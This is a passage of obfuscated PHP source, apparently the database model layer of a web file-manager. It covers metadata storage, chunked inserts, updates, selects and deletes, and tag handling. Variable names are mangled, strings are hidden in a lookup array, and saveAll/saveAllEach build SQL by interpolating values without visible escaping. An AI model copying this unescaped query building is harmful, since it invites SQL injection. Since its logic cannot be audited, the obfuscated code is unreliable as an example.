= $this->page($ß’«ùÌ·, $„ÙÜº)->select(); } if (!is_array($å³¾–Ñ€)) { $å³¾–Ñ€ = array(); } if ($ß¿áĞÕÍ == 1) { $‰Ï¡áœû = count($å³¾–Ñ€); } $ÚíøÖ = array($¶’éŞÌ[417] => array($¶’éŞÌ[418] => $‰Ï¡áœû, $¶’éŞÌ[414] => $„ÙÜº, $¶’éŞÌ[404] => $ß’«ùÌ·, $¶’éŞÌ[419] => $ß¿áĞÕÍ), $¶’éŞÌ[420] => $å³¾–Ñ€); return $ÚíøÖ; } protected function checkLength($‘úŒß, $–È¡ıÎİ = 0, $İúÁƒ•Ë = '') { $úˆÉúÆ˜ =& $_SERVER[³à¼î¯á]; $–È¡ıÎİ = $–È¡ıÎİ ? $–È¡ıÎİ : 65536; if (!$‘úŒß || strlen($‘úŒß) < $–È¡ıÎİ) { return; } $İúÁƒ•Ë = $İúÁƒ•Ë ? $İúÁƒ•Ë . $úˆÉúÆ˜[74] : $úˆÉúÆ˜[12]; show_json($İúÁƒ•Ë . LNG($úˆÉúÆ˜[421]) . "\50{$–È¡ıÎİ}\x29", !1); } protected function metaSet($èí’€äû, $ü²¨©µÇ = null, $ğú²•ÕÃ = null) { $æˆ˜†ïÀ =& $_SERVER[³à¼î¯á]; if (!$this->tableMeta || !$èí’€äû) { return !1; } $ê˜¶çš = $this->tableMeta[$æˆ˜†ïÀ[422]]; $è å¢³ = $this->tableMeta[$æˆ˜†ïÀ[423]]; $´ØÚÒ¬ì = Model($è å¢³); $ª„Û» = array($ê˜¶çš => $èí’€äû, $æˆ˜†ïÀ[424] => $ü²¨©µÇ); if (is_null($ü²¨©µÇ)) { return $´ØÚÒ¬ì->where(array($ê˜¶çš => $èí’€äû))->delete(); } if (is_null($ğú²•ÕÃ) && is_string($ü²¨©µÇ)) { return $´ØÚÒ¬ì->where($ª„Û»)->delete(); } $­í¦¨Á¼ = is_array($ü²¨©µÇ) ? $ü²¨©µÇ : array(); if (is_string($ü²¨©µÇ)) { $­í¦¨Á¼[$ü²¨©µÇ] = $ğú²•ÕÃ; } $„ÀªíÁ = array(); foreach ($­í¦¨Á¼ as $ÁÛÓ†ÕÏ => $ŞÊ»¸ºµ) { if (is_null($ŞÊ»¸ºµ) && is_string($ÁÛÓ†ÕÏ)) { $´ØÚÒ¬ì->where(array($ê˜¶çš => $èí’€äû, $æˆ˜†ïÀ[424] => $ÁÛÓ†ÕÏ))->delete(); continue; } $this->checkLength($ŞÊ»¸ºµ, !1, $è å¢³ . $æˆ˜†ïÀ[4] . $ÁÛÓ†ÕÏ); $„ÀªíÁ[] = array($ê˜¶çš => $èí’€äû, $æˆ˜†ïÀ[97] => $ÁÛÓ†ÕÏ, $æˆ˜†ïÀ[425] => $ŞÊ»¸ºµ); } $©§ì‹°¶ = $æˆ˜†ïÀ[426] . $è å¢³; CacheLock::lock($©§ì‹°¶); $´ØÚÒ¬ì->where(array($ê˜¶çš => $èí’€äû))->addAll($„ÀªíÁ, array(), !0); CacheLock::unlock($©§ì‹°¶); return !0; } public function metaGet($«»Ÿ„¦÷, $¸ş›ÇËŞ = false) { $Ûüæ¤‰ì =& $_SERVER[³à¼î¯á]; if (!$this->tableMeta) { return array(); } $µ«”ïë = $this->tableMeta[$Ûüæ¤‰ì[422]]; $÷æ”äÙÂ = Model($this->tableMeta[$Ûüæ¤‰ì[423]]); if ($¸ş›ÇËŞ) { $Õö ‘Ÿß = array($µ«”ïë => $«»Ÿ„¦÷, $Ûüæ¤‰ì[97] => $¸ş›ÇËŞ); return $÷æ”äÙÂ->where($Õö ‘Ÿß)->getField($Ûüæ¤‰ì[425]); } $Õö ‘Ÿß = array($µ«”ïë => $«»Ÿ„¦÷); $ÄĞĞì ş = $÷æ”äÙÂ->field($Ûüæ¤‰ì[427])->where($Õö ‘Ÿß)->select(); $ÄĞĞì ş = array_to_keyvalue($ÄĞĞì ş, $Ûüæ¤‰ì[97], $Ûüæ¤‰ì[425]); return $ÄĞĞì ş; } private function checkDataAutoHas($¡ß°ÕèĞ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ãŞ•‘Úö) { if (in_array($¡ß°ÕèĞ, explode($_SERVER[³à¼î¯á][50], $ãŞ•‘Úö[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ÊÅ¶¯ñí, $æ©µ˜”–) { $úÄ·¢î =& $_SERVER[³à¼î¯á]; if (!is_array($ÊÅ¶¯ñí)) { return; } foreach ($this->dataAuto as $±Ô€ŸŠ) { $¸ Äşúª = $±Ô€ŸŠ[0]; if (!in_array($æ©µ˜”–, explode($úÄ·¢î[50], $±Ô€ŸŠ[2]))) { continue; } switch (trim($±Ô€ŸŠ[3])) { case $úÄ·¢î[372]: case $úÄ·¢î[373]: $øºß™ÒÚ = $±Ô€ŸŠ[1]; $º—Ó•Üş = isset($±Ô€ŸŠ[4]) ? (array) $±Ô€ŸŠ[4] : array(); if ($øºß™ÒÚ == $úÄ·¢î[197] && array_key_exists($¸ Äşúª, $ÊÅ¶¯ñí)) { if (!$ÊÅ¶¯ñí[$¸ Äşúª]) { unset($ÊÅ¶¯ñí[$¸ Äşúª]); } break; } if (isset($ÊÅ¶¯ñí[$¸ Äşúª])) { array_unshift($º—Ó•Üş, $ÊÅ¶¯ñí[$¸ Äşúª]); } if ($úÄ·¢î[372] == $±Ô€ŸŠ[3]) { $ÊÅ¶¯ñí[$¸ Äşúª] = call_user_func_array($øºß™ÒÚ, $º—Ó•Üş); } else { $ÊÅ¶¯ñí[$¸ Äşúª] = call_user_func_array(array(&$this, $øºß™ÒÚ), $º—Ó•Üş); } break; case $úÄ·¢î[322]: if (isset($ÊÅ¶¯ñí[$¸ Äşúª]) && $ÊÅ¶¯ñí[$¸ Äşúª]) { $ÊÅ¶¯ñí[$¸ Äşúª] = call_user_func_array(array(&$this, $±Ô€ŸŠ[1]), array($ÊÅ¶¯ñí[$¸ Äşúª])); } break; case $úÄ·¢î[325]: $ÊÅ¶¯ñí[$¸ Äşúª] = $ÊÅ¶¯ñí[$±Ô€ŸŠ[1]]; break; case $úÄ·¢î[345]: if (isset($ÊÅ¶¯ñí[$¸ Äşúª]) && !is_string($ÊÅ¶¯ñí[$¸ Äşúª])) { $ÊÅ¶¯ñí[$¸ Äşúª] = json_encode_force($ÊÅ¶¯ñí[$¸ Äşúª]); } break; case $úÄ·¢î[374]: if ($ÊÅ¶¯ñí[$¸ Äşúª] === $úÄ·¢î[12]) { unset($ÊÅ¶¯ñí[$¸ Äşúª]); } break; case $úÄ·¢î[375]: $ÊÅ¶¯ñí[$¸ Äşúª] = $±Ô€ŸŠ[1]; default: break; } } if ($æ©µ˜”– == $úÄ·¢î[406]) { $°»É×Ô™ = strtolower($this->db->getDbType()); if (strpos($°»É×Ô™, $úÄ·¢î[13]) !== 0) { return; } $Æ‰ŞÊá× = $this->field(!0)->fields; $¤üß¥²³ = $Æ‰ŞÊá×[$úÄ·¢î[304]]; if (isset($Æ‰ŞÊá×[$úÄ·¢î[303]])) { unset($¤üß¥²³[$Æ‰ŞÊá×[$úÄ·¢î[303]]]); } foreach ($¤üß¥²³ as $ï½ğ¿ => $æ©µ˜”–) { if (!isset($ÊÅ¶¯ñí[$ï½ğ¿])) { $ÊÅ¶¯ñí[$ï½ğ¿] = $úÄ·¢î[12]; } } } } private function dataAfterFilter(&$ùù“£°½) { $ëø†ÖúŸ =& $_SERVER[³à¼î¯á]; foreach ($this->dataAuto as $…Åñ£”£) { $îÒÖ–İ“ = $…Åñ£”£[0]; if (!isset($ùù“£°½[$îÒÖ–İ“])) { continue; } if (!in_array($ëø†ÖúŸ[408], explode($ëø†ÖúŸ[50], $…Åñ£”£[2]))) { continue; } switch (trim($…Åñ£”£[3])) { case $ëø†ÖúŸ[372]: case $ëø†ÖúŸ[373]: $Ó„ë¶ò = isset($…Åñ£”£[4]) ? (array) $…Åñ£”£[4] : array(); array_unshift($Ó„ë¶ò, $ùù“£°½[$îÒÖ–İ“]); if (isset($…Åñ£”£[4]) && $…Åñ£”£[4] == $ëø†ÖúŸ[428]) { $Ó„ë¶ò = array($ùù“£°½[$îÒÖ–İ“]); } if ($ëø†ÖúŸ[372] == $…Åñ£”£[3]) { $ùù“£°½[$îÒÖ–İ“] = call_user_func_array($…Åñ£”£[1], $Ó„ë¶ò); } else { $ùù“£°½[$îÒÖ–İ“] = call_user_func_array(array(&$this, $…Åñ£”£[1]), $Ó„ë¶ò); } break; case $ëø†ÖúŸ[322]: if (isset($ùù“£°½[$îÒÖ–İ“]) && $ùù“£°½[$îÒÖ–İ“]) { $ùù“£°½[$îÒÖ–İ“] = call_user_func_array(array(&$this, $…Åñ£”£[1]), array($ùù“£°½[$îÒÖ–İ“])); } break; case $ëø†ÖúŸ[325]: $ùù“£°½[$îÒÖ–İ“] = $ùù“£°½[$…Åñ£”£[1]]; break; case $ëø†ÖúŸ[345]: $è¯î¸±ß = $ùù“£°½[$îÒÖ–İ“]; $ùù“£°½[$îÒÖ–İ“] = json_decode($è¯î¸±ß, !0); if (is_null($ùù“£°½[$îÒÖ–İ“])) { $ùù“£°½[$îÒÖ–İ“] = $è¯î¸±ß; } break; case $ëø†ÖúŸ[374]: if ($ùù“£°½[$îÒÖ–İ“] === $ëø†ÖúŸ[12]) { unset($ùù“£°½[$îÒÖ–İ“]); } break; case $ëø†ÖúŸ[375]: $ùù“£°½[$îÒÖ–İ“] = $…Åñ£”£[1]; break; default: break; } } } public function saveAll($Ÿ””À¦€) { $ ğæ‘®Ö =& $_SERVER[³à¼î¯á]; $ßÜßñ‰Í = $this->tablePrefix . $this->tableName; $úˆ¢èÜÓ = self::SQL_WHERE_IN_CHUNK; $Ÿ””À¦€ = is_array($Ÿ””À¦€) ? $Ÿ””À¦€ : array(); $Ü˜ÖúøÅ = $ ğæ‘®Ö[429]; $Ì‡¤ŠË¨ = 0; $›ğİ‡ª = array(); $Ä«½°²º = count($Ÿ””À¦€); for ($é¯¶«®Å = 0; $é¯¶«®Å < $Ä«½°²º; $é¯¶«®Å++) { $Á–÷Ç—â = $Ÿ””À¦€[$é¯¶«®Å]; if (!is_array($Á–÷Ç—â) || count($Á–÷Ç—â) != 4) { continue; } $ñÎº£ = "\125\120\x44\101\124\105\x20\x60{$ßÜßñ‰Í}\x60\x20\x53\x45\124\40{$Á–÷Ç—â[2]}\x20\75\x20\103\x41\x53\105\x20{$Á–÷Ç—â[0]}\x20\xa"; if ($Ì‡¤ŠË¨ == 0) { $Ü˜ÖúøÅ = $ñÎº£; } $›ğİ‡ª[] = $ ğæ‘®Ö[121] . $Á–÷Ç—â[1] . $ ğæ‘®Ö[121]; $Ì‡¤ŠË¨++; $Ü˜ÖúøÅ .= "\40\127\110\105\x4e\40\x27{$Á–÷Ç—â[1]}\47\40\x54\110\105\116\x20\47{$Á–÷Ç—â[3]}\47\40\12"; if ($Ì‡¤ŠË¨ == $úˆ¢èÜÓ || $é¯¶«®Å == $Ä«½°²º - 1) { $Ù¦ÈÁ…ö = implode($ ğæ‘®Ö[50], $›ğİ‡ª); $Ü˜ÖúøÅ .= "\40\x45\x4e\104\x20\40\127\110\105\122\105\x20{$Á–÷Ç—â[0]}\x20\x49\x4e\x20\x28{$Ù¦ÈÁ…ö}\x29\40"; $this->execute($Ü˜ÖúøÅ); $Ì‡¤ŠË¨ = 0; $Ü˜ÖúøÅ = $ñÎº£; $this->chunkEventCheck(count($›ğİ‡ª)); $›ğİ‡ª = array(); } } $this->chunkEventSet(); } public function saveAllEach($¾ı§ÆåÄ) { $íÄóß =& $_SERVER[³à¼î¯á]; $åË§›ËÛ = $this->tablePrefix . $this->tableName; foreach ($¾ı§ÆåÄ as $Ùã¯œ€) { if (!is_array($Ùã¯œ€) || count($Ùã¯œ€) != 4) { continue; } $çûŒø•´ = $Ùã¯œ€[0] . $íÄóß[430] . $Ùã¯œ€[1] . $íÄóß[121]; $—Íö§ä± = $Ùã¯œ€[2] . $íÄóß[430] . $Ùã¯œ€[3] . $íÄóß[121]; $ÁÇÆç¤ô = "\x75\160\x64\x61\164\145\40{$åË§›ËÛ}\x20\163\x65\x74\40{$—Íö§ä±}\x20\x77\x68\x65\x72\x65\x20{$çûŒø•´}\73"; $this->execute($ÁÇÆç¤ô); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($®Êø‚…  = false, $‰óàÙ³« = false) { $this->_chunkEvent = $®Êø‚… ; $this->_chunkEventParam = $‰óàÙ³«; } private function chunkEventCheck($ôÓ¥½·Å) { if (!$this->_chunkEvent) { return; } $Ú³ÖüÒí = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ú³ÖüÒí[$_SERVER[³à¼î¯á][431]] = $ôÓ¥½·Å; Hook::trigger($this->_chunkEvent, $Ú³ÖüÒí); } public function addAll($”ºËæ¯©, $óçáÑÚğ = array(), $ÈİÚ†±‡ = false) { $¾ßÇí =& $_SERVER[³à¼î¯á]; ignore_timeout(); $Ÿ÷á¶¦ = self::SQL_WHERE_IN_CHUNK; if (empty($”ºËæ¯©)) { $this->error = think_lang($¾ßÇí[323]); return !1; } $óçáÑÚğ = $this->_parseOptions($óçáÑÚğ); foreach ($”ºËæ¯© as $—÷í¦•Ü => $±ìÓÃ÷û) { $”ºËæ¯©[$—÷í¦•Ü] = $this->_facade($±ìÓÃ÷û); $this->_beforeInsert($”ºËæ¯©[$—÷í¦•Ü], $óçáÑÚğ); } if (method_exists($this->db, $¾ßÇí[324])) { for ($—ìÛÒƒÓ = 0; $—ìÛÒƒÓ < count($”ºËæ¯©); $—ìÛÒƒÓ += $Ÿ÷á¶¦) { $µ• µ° = array_slice($”ºËæ¯©, $—ìÛÒƒÓ, $Ÿ÷á¶¦); if (!is_array($µ• µ°) || count($µ• µ°) == 0) { break; } $²Âë®†¨ = $this->db->insertAll($µ• µ°, $óçáÑÚğ, $ÈİÚ†±‡); $this->chunkEventCheck(count($µ• µ°)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($”ºËæ¯© as $—÷í¦•Ü => $±ìÓÃ÷û) { $²Âë®†¨ = $this->db->insert($±ìÓÃ÷û, $óçáÑÚğ, $ÈİÚ†±‡); } $this->commit(); } if (!1 !== $²Âë®†¨) { $™åÕ™„Á = $this->getLastInsID(); if ($™åÕ™„Á) { return $™åÕ™„Á; } } return $²Âë®†¨; } public function save($İª°’ºî = '', $æÔŒ¿å… = array()) { $Ã÷ËÁö =& $_SERVER[³à¼î¯á]; $Ë«ä¾¢» = self::SQL_WHERE_IN_CHUNK; $ÙÍª½’À = $this->optionsValue(); $±„¤–ô£ = $this->findWhereField($ÙÍª½’À); if (!$±„¤–ô£) { return parent::save($İª°’ºî, $æÔŒ¿å…); } $ôâê’Ã = 0; $É–³ØâÜ = $ÙÍª½’À[$Ã÷ËÁö[327]][$±„¤–ô£][1]; $É–³ØâÜ = is_array($É–³ØâÜ) ? $É–³ØâÜ : array(); $ÕûŸÔôÔ = count($É–³ØâÜ); for ($„¼ú½Ã = 0; $„¼ú½Ã < $ÕûŸÔôÔ; $„¼ú½Ã += $Ë«ä¾¢») { $ºáÕ³Ê¨ = array_slice($É–³ØâÜ, $„¼ú½Ã, $Ë«ä¾¢»); if (!is_array($ºáÕ³Ê¨) || count($ºáÕ³Ê¨) == 0) { break; } $ÙÍª½’À[$Ã÷ËÁö[327]][$±„¤–ô£][1] = $ºáÕ³Ê¨; $this->optionsValue($ÙÍª½’À); $ôâê’Ã += parent::save($İª°’ºî, $æÔŒ¿å…); $this->chunkEventCheck(count($ºáÕ³Ê¨)); } $this->chunkEventSet(); return $ôâê’Ã; } public function add($¾„ÉÓŞ‡ = '', $ƒ÷¾×É² = array(), $®Á¬ÕöÈ = false) { if ($this->addTaskStatus && is_array($¾„ÉÓŞ‡)) { $this->addTaskData[] = $¾„ÉÓŞ‡; return; } return parent::add($¾„ÉÓŞ‡, $ƒ÷¾×É², $®Á¬ÕöÈ); } public function parseWhereLike($—ÓÆùØë, $ğò¨ÂÕ = '', $µ„‡èêì = false, &$§Ìæø–œ = false) { $¼¹È‘£Î =& $_SERVER[³à¼î¯á]; $íÏÊæóĞ = $GLOBALS[$¼¹È‘£Î[6]][$¼¹È‘£Î[432]]; if (!$íÏÊæóĞ[$¼¹È‘£Î[433]]) { return $—ÓÆùØë; } if (!is_array($—ÓÆùØë)) { return $—ÓÆùØë; } $„ñôå¿ = array(); $ïœëÙÒ = 0; foreach ($—ÓÆùØë as $±¦…êíÇ => $ëÇ¡¯£) { if (is_array($ëÇ¡¯£) && count($ëÇ¡¯£) == 2 && $ëÇ¡¯£[0] == $¼¹È‘£Î[434] && is_string($ëÇ¡¯£[1]) && substr($ëÇ¡¯£[1], 0, 1) == $¼¹È‘£Î[435] && substr($ëÇ¡¯£[1], strlen($ëÇ¡¯£[1]) - 1, 1) == $¼¹È‘£Î[435]) { $§Ìæø–œ = !0; $‡•§êÓì = is_string($±¦…êíÇ) ? $±¦…êíÇ : $ğò¨ÂÕ; $š¼Ÿ¤î¾ = substr($ëÇ¡¯£[1], 1, strlen($ëÇ¡¯£[1]) - 2); $š¼Ÿ¤î¾ = $this->db->escapeString($š¼Ÿ¤î¾); if (!strpos($‡•§êÓì, $¼¹È‘£Î[10])) { $‡•§êÓì = $¼¹È‘£Î[436] . $‡•§êÓì . $¼¹È‘£Î[436]; } $ŞÂë—ÅÃ = $¼¹È‘£Î[211] . $š¼Ÿ¤î¾ . $¼¹È‘£Î[211]; $š¼Ÿ¤î¾ = str_replace(array($¼¹È‘£Î[10], $¼¹È‘£Î[437], $¼¹È‘£Î[11]), $¼¹È‘£Î[438], $š¼Ÿ¤î¾); if ($íÏÊæóĞ[$¼¹È‘£Î[439]]) { $ŞÂë—ÅÃ = $¼¹È‘£Î[440] . $š¼Ÿ¤î¾ . $¼¹È‘£Î[441]; if ($íÏÊæóĞ[$¼¹È‘£Î[442]]) { $ŞÂë—ÅÃ = $¼¹È‘£Î[441] . $š¼Ÿ¤î¾ . $¼¹È‘£Î[440]; } } $„ñôå¿[$ïœëÙÒ] = $¼¹È‘£Î[443] . $‡•§êÓì . $¼¹È‘£Î[444] . $ŞÂë—ÅÃ . $¼¹È‘£Î[445]; $ïœëÙÒ++; continue; } if (is_array($ëÇ¡¯£)) { $ğò¨ÂÕ = is_string($±¦…êíÇ) ? $±¦…êíÇ : $ğò¨ÂÕ; $ëÇ¡¯£ = $this->parseWhereLike($ëÇ¡¯£, $ğò¨ÂÕ, !0, $§Ìæø–œ); } if (is_numeric($±¦…êíÇ)) { $„ñôå¿[$ïœëÙÒ] = $ëÇ¡¯£; $ïœëÙÒ++; } else { $„ñôå¿[$±¦…êíÇ] = $ëÇ¡¯£; } } if ($§Ìæø–œ && !$µ„‡èêì) { } return $„ñôå¿; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ßÒ”àÖ¸ = array()) { $™Âş•Úé =& $_SERVER[³à¼î¯á]; $×Í’¦ç = self::SQL_WHERE_IN_CHUNK; $ĞıÉ³Ù = $this->optionsValue(); $Æ¸ù³×‘ = $this->findWhereField($ĞıÉ³Ù); if (!$Æ¸ù³×‘ || isset($ĞıÉ³Ù[$™Âş•Úé[343]]) || isset($ĞıÉ³Ù[$™Âş•Úé[404]])) { return parent::select($ßÒ”àÖ¸); } $Ãº®ä¢ = $ĞıÉ³Ù[$™Âş•Úé[327]][$Æ¸ù³×‘][1]; $Ãº®ä¢ = is_array($Ãº®ä¢) ? $Ãº®ä¢ : array(); $±±› ®ù = null; for ($¼¬ı—Õî = 0; $¼¬ı—Õî < count($Ãº®ä¢); $¼¬ı—Õî += $×Í’¦ç) { $ƒŸ¤¦µú = array_slice($Ãº®ä¢, $¼¬ı—Õî, $×Í’¦ç); if (!is_array($ƒŸ¤¦µú) || count($ƒŸ¤¦µú) == 0) { break; } $ĞıÉ³Ù[$™Âş•Úé[327]][$Æ¸ù³×‘][1] = $ƒŸ¤¦µú; $this->optionsValue($ĞıÉ³Ù); $ıñÖèÉè = parent::select($ßÒ”àÖ¸); if (!$ıñÖèÉè) { continue; } $±±› ®ù = is_array($±±› ®ù) ? $±±› ®ù : array(); $±±› ®ù = array_merge($±±› ®ù, $ıñÖèÉè); } return $±±› ®ù; } public function delete($Š±´Ä“Ò = array()) { $õÅŒ—¯ˆ =& $_SERVER[³à¼î¯á]; $áé·ÀÁû = self::SQL_WHERE_IN_CHUNK; $°ù¾âÓã = $this->optionsValue(); $¬Šäâö‡ = $this->findWhereField($°ù¾âÓã); if (!$¬Šäâö‡) { return parent::delete($Š±´Ä“Ò); } $é¸ÉçÏÕ = 0; $Â–Ô÷›µ = $°ù¾âÓã[$õÅŒ—¯ˆ[327]][$¬Šäâö‡][1]; $Â–Ô÷›µ = is_array($Â–Ô÷›µ) ? $Â–Ô÷›µ : array(); for ($®±ÈúÀÂ = 0; $®±ÈúÀÂ < count($Â–Ô÷›µ); $®±ÈúÀÂ += $áé·ÀÁû) { $¿¨«ó = array_slice($Â–Ô÷›µ, $®±ÈúÀÂ, $áé·ÀÁû); if (!is_array($¿¨«ó) || count($¿¨«ó) == 0) { break; } $°ù¾âÓã[$õÅŒ—¯ˆ[327]][$¬Šäâö‡][1] = $¿¨«ó; $this->optionsValue($°ù¾âÓã); $é¸ÉçÏÕ += parent::delete($Š±´Ä“Ò); } return $é¸ÉçÏÕ; } private function findWhereField($ã¬·õÕş) { $»˜Ğõóá =& $_SERVER[³à¼î¯á]; $†·ìï’² = self::SQL_WHERE_IN_CHUNK; if (!is_array($ã¬·õÕş) || !is_array($ã¬·õÕş[$»˜Ğõóá[327]])) { return !1; } foreach ($ã¬·õÕş[$»˜Ğõóá[327]] as $Üü¡Œ => $ãÁş) { if (is_array($ãÁş) && isset($ãÁş[0]) && is_string($ãÁş[0]) && strtolower($ãÁş[0]) == $»˜Ğõóá[7] && is_array($ãÁş[1]) && count($ãÁş[1]) > $†·ìï’²) { ignore_timeout(); return $Üü¡Œ; } } return !1; } public function setMasterDB($ÛÂ¢½•• = true) { think_config($_SERVER[³à¼î¯á][446], $ÛÂ¢½••); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\x6d\x4f\160\x74\x69\157\x6e"; public $field = array(); public function listData($ä˜ôİ = false, $Ê³éÕ™ü = "\155\x6f\x64\151\x66\171\124\151\155\x65", $ŒÏ³Ÿ×… = false) { $ŞÚ·Û›ú = Model($this->modelType)->get(!1, $this->optionType, !0); $Œ‡Ğ±„ù = array_values($ŞÚ·Û›ú); if ($Œ‡Ğ±„ù && $Œ‡Ğ±„ù[0] && !is_array($Œ‡Ğ±„ù[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ŞÚ·Û›ú = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ŞÚ·Û›ú) { return $ä˜ôİ ? null : array(); } if (!$ä˜ôİ) { $ŞÚ·Û›ú = array_filter(array_values($ŞÚ·Û›ú)); return array_sort_by($ŞÚ·Û›ú, $Ê³éÕ™ü, $ŒÏ³Ÿ×…); } return $ŞÚ·Û›ú[$_SERVER[³à¼î¯á][447] . $ä˜ôİ]; } public function insert($ÔÎ“¶) { $ë‰€º€• =& $_SERVER[³à¼î¯á]; $ÔÎ“¶ = array_field_key($ÔÎ“¶, $this->field); $¨Ÿ½íì© = Model($this->modelType)->get($ë‰€º€•[448], $this->optionType . $ë‰€º€•[449]); $¨Ÿ½íì© = $¨Ÿ½íì© ? $¨Ÿ½íì© : 0; $ÔÎ“¶[$ë‰€º€•[450]] = ++$¨Ÿ½íì©; $ÔÎ“¶[$ë‰€º€•[222]] = time(); $ÔÎ“¶[$ë‰€º€•[88]] = time(); Model($this->modelType)->set($ë‰€º€•[448], $¨Ÿ½íì©, $this->optionType . $ë‰€º€•[449]); Model($this->modelType)->set($ë‰€º€•[447] . $¨Ÿ½íì©, $ÔÎ“¶, $this->optionType); return $¨Ÿ½íì©; } public function update($‘Ì¯ö–Á, $À¨Ï–…÷) { $šÚĞê’¾ =& $_SERVER[³à¼î¯á]; $À¨Ï–…÷ = array_field_key($À¨Ï–…÷, $this->field); $Í§ë’¡ = $this->listData($‘Ì¯ö–Á); if (!$Í§ë’¡ || !$‘Ì¯ö–Á) { return !1; } $À¨Ï–…÷ = array_merge($Í§ë’¡, $À¨Ï–…÷); $À¨Ï–…÷[$šÚĞê’¾[88]] = time(); return Model($this->modelType)->set($šÚĞê’¾[447] . $‘Ì¯ö–Á, $À¨Ï–…÷, $this->optionType); } public function remove($ÁÙÓÇ±ä) { if (!$ÁÙÓÇ±ä) { return !1; } return Model($this->modelType)->remove($_SERVER[³à¼î¯á][447] . $ÁÙÓÇ±ä, $this->optionType); } public function clear() { $ñû˜œõ =& $_SERVER[³à¼î¯á]; Model($this->modelType)->remove($ñû˜œõ[448], $this->optionType . $ñû˜œõ[449]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($öó¸º, $“ÅãíùÆ) { if (!$“ÅãíùÆ) { return !1; } $½²äè¡Û = $this->listData(); $½²äè¡Û = array_to_keyvalue($½²äè¡Û, $öó¸º); return isset($½²äè¡Û[$“ÅãíùÆ]) ? $½²äè¡Û[$“ÅãíùÆ] : !1; } public function findByName($³·Ÿò‚) { return $this->findByKey($_SERVER[³à¼î¯á][32], $³·Ÿò‚); } protected function resetData($¿÷»áøæ) { $óÖÚÄÆ² =& $_SERVER[³à¼î¯á]; $¿÷»áøæ = is_array($¿÷»áøæ) ? $¿÷»áøæ : array(); $ŠÔ³Ç® = array(); for ($¢™ß‡Òº = 0; $¢™ß‡Òº < count($¿÷»áøæ); $¢™ß‡Òº++) { $ŠÔ³Ç®[$óÖÚÄÆ²[447] . $¿÷»áøæ[$¢™ß‡Òº][$óÖÚÄÆ²[450]]] = $¿÷»áøæ[$¢™ß‡Òº]; } return Model($this->modelType)->set($ŠÔ³Ç®, !1, $this->optionType); } private function getAutoName($ äÁ©) { $Øå€“ıÈ = array_to_keyvalue($this->listData(), $_SERVER[³à¼î¯á][32]); if (!$Øå€“ıÈ || !isset($Øå€“ıÈ[$ äÁ©])) { return $ äÁ©; } for ($‚»®‘Ê‰ = 1; $‚»®‘Ê‰ < count($Øå€“ıÈ); $‚»®‘Ê‰++) { $š§¨¾‰ğ = $ äÁ© . "\x28{$‚»®‘Ê‰}\x29"; if (!isset($Øå€“ıÈ[$š§¨¾‰ğ])) { return $š§¨¾‰ğ; } } return $š§¨¾‰ğ; } } goto EİÒÈÎ‡—õ; fù†ì”½–Ü: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\x66\141\x76"; protected function cacheFunctionAlias($ì¥Ì¦âÍ) { $…¯™³üê =& $_SERVER[³à¼î¯á]; return array($…¯™³üê[2068] => array($…¯™³üê[2482] . USER_ID, $…¯™³üê[2069])); } protected function listData() { $À·½ˆ•å =& $_SERVER[³à¼î¯á]; $¿ÑúÑ = array($À·½ˆ•å[1744] => USER_ID, $À·½ˆ•å[533] => array($À·½ˆ•å[2072], 0)); $„ïÀìò = $À·½ˆ•å[2483]; $‘‘¿©Ê¯ = $this->field($„ïÀìò)->where($¿ÑúÑ)->order($À·½ˆ•å[2075])->select(); return $‘‘¿©Ê¯ ? $‘‘¿©Ê¯ : array(); } protected function addToTag($üù¦š„, $Á…’¯™ù) { $Œı‘·† =& $_SERVER[³à¼î¯á]; if (!Model($Œı‘·†[2219])->listData($Á…’¯™ù)) { return !1; } if (is_numeric($üù¦š„)) { $ºÁÒÑ‘Ô = Model($Œı‘·†[869])->pathInfo($üù¦š„); if (!$ºÁÒÑ‘Ô) { return !1; } } else { $ºÁÒÑ‘Ô = IO::infoSimple($üù¦š„); if (!$ºÁÒÑ‘Ô) { return !1; } $úÖ™³ = $ºÁÒÑ‘Ô[$Œı‘·†[32]]; $ÙñÕÔ‹Œ = $ºÁÒÑ‘Ô[$Œı‘·†[33]]; if (isset($ºÁÒÑ‘Ô[$Œı‘·†[460]])) { $ÙñÕÔ‹Œ = $ºÁÒÑ‘Ô[$Œı‘·†[460]] == $Œı‘·†[91] ? $Œı‘·†[78] : $Œı‘·†[221]; } } $õÓ˜×Ğ® = array($Œı‘·†[1744] => USER_ID, $Œı‘·†[533] => $Á…’¯™ù, $Œı‘·†[470] => $üù¦š„, $Œı‘·†[471] => $ÙñÕÔ‹Œ ? $ÙñÕÔ‹Œ : $Œı‘·†[465], $Œı‘·†[469] => $úÖ™³ ? $úÖ™³ : $Œı‘·†[12], $Œı‘·†[1956] => 0); if ($this->where($õÓ˜×Ğ®)->find()) { return !1; } return $this->add($õÓ˜×Ğ®); } protected function removeFromTag($ĞÂÂ†ºˆ, $‚çõã) { $¶ğÖï¥¸ =& $_SERVER[³à¼î¯á]; if (!Model($¶ğÖï¥¸[2219])->listData($‚çõã)) { return !1; } if (is_array($ĞÂÂ†ºˆ)) { $ĞÂÂ†ºˆ = array($¶ğÖï¥¸[7], $ĞÂÂ†ºˆ); } $ıì¯ğìÁ = array($¶ğÖï¥¸[1744] => USER_ID, $¶ğÖï¥¸[533] => $‚çõã, $¶ğÖï¥¸[470] => $ĞÂÂ†ºˆ); return $this->where($ıì¯ğìÁ)->delete(); } protected function removeByTag($‘ô¶Ÿ” ) { $âÒµóóÊ =& $_SERVER[³à¼î¯á]; if (!$‘ô¶Ÿ” ) { return !1; } $Ú™¢³Û = array($âÒµóóÊ[1744] => USER_ID, $âÒµóóÊ[533] 